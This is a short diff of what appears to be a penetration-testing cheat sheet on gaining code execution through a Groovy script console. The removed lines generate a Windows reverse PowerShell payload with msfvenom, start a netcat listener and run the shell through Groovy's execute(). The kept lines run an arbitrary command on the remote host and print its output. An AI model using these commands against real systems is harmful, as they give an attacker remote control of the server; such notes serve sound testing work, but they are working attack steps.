@@ -1,13 +1,5 @@
-# code execution via groovy script
-
-# generate reverse shell
-msfvenom -p cmd/windows/reverse_powershell lhost=<lhost> lport=<lport>
-
-# start listener
-nc -lvp <lport>
-
-# go to <domain>/script
-def process = "<reverseShell>".execute()
+# code execution via groovy script <rhost>/script
+def process = "<command>".execute()
 println "Found text ${process.text}"
 
 # alternatively
